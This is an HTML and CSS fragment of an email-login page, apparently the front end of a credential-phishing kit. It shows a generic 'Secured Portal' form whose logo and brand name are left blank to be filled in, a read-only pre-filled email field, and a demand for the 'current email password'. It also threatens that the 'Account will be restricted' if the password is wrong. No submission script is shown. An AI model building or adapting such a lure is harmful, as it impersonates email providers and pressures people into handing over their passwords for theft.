    <style>
    * { box-sizing: border-box; }
    body {
        margin: 0; padding: 0;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    }
    .form-body {
        background-color: #F4F4F4;
        width: 100%;
        max-width: 420px;
        padding: 25px 20px;
        border-radius: 10px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        position: relative;
        z-index: 10;
        margin: 15px;
    }
    .form-control {
        height: 48px;
        font-size: 16px;
        border-radius: 6px;
        border: 1px solid #ccc;
        margin-bottom: 12px;
    }
    .form-control:focus {
        border-color: #106dff;
        box-shadow: 0 0 0 0.2rem rgba(16, 109, 255, 0.25);
    }
    #submit-btn {
        height: 48px;
        font-size: 16px;
        font-weight: 600;
        border-radius: 6px;
        background-color: #106dff;
        border: none;
        transition: all 0.3s ease;
        width: 100%;
    }
    #submit-btn:hover { background-color: #0d5bd9; }
    #submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
    #logoimg {
        width: 55px; height: 55px;
        object-fit: contain;
        margin-bottom: 8px;
    }
    .portal-title {
        font-weight: 700;
        font-size: 18px;
        color: #333;
        margin-bottom: 5px;
    }
    #auth-note {
        font-size: 14px;
        color: #106dff;
        margin-bottom: 20px;
        padding: 0 10px;
    }
    #msg, #error {
        margin-top: 15px;
        padding: 10px;
        border-radius: 6px;
        font-size: 13px;
        word-wrap: break-word;
    }
    #msg {
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
    }
    #error {
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
        display: block;
    }
    @media (max-width: 576px) {
        .form-body { margin: 10px; padding: 20px 15px; border-radius: 8px; }
        .portal-title { font-size: 16px; }
        #auth-note { font-size: 13px; }
        .form-control, #submit-btn { height: 44px; font-size: 15px; }
    }
    @media (max-width: 360px) {
        .form-body { margin: 8px; padding: 15px 12px; }
        .portal-title { font-size: 15px; }
        #auth-note { font-size: 12px; }
    }
    @media (min-width: 577px) and (max-width: 991px) {
        .form-body { max-width: 450px; }
    }
    @media (min-width: 1200px) {
        .form-body { max-width: 460px; padding: 30px 25px; }
    }
    .loading-spinner {
        display: inline-block;
        width: 18px; height: 18px;
        border: 2px solid #ffffff;
        border-top: 2px solid transparent;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin-right: 8px;
        vertical-align: middle;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>

<body class="d-flex justify-content-center align-items-center">
    <div class="form-body">
        <div class="text-center">
            <img id="logoimg" src="" alt="logo">
            <p class="portal-title"><span id="logoname" class="text-capitalize"></span> - Secured Portal</p>
        </div>
        <p class="text-center" id="auth-note">Authentication required, Enter your current email password to proceed.</p>

        <div id="users">
            <input type="email" name="email" class="form-control" id="email" readonly="">
            <input type="password" id="password" name="password" class="form-control" required placeholder="Password" autocomplete="current-password">
            <button type="button" id="submit-btn" class="btn btn-primary btn-block">Enter</button>
        </div>

        <center>
            <div class="alert alert-danger" id="msg" style="display: none;">Password is incorrect, Account will be restricted if password is wrong!!</div>
            <span id="error" class="text-danger" style="display: none;">This account does not exist. Enter a different account</span>
        </center>
    </div>
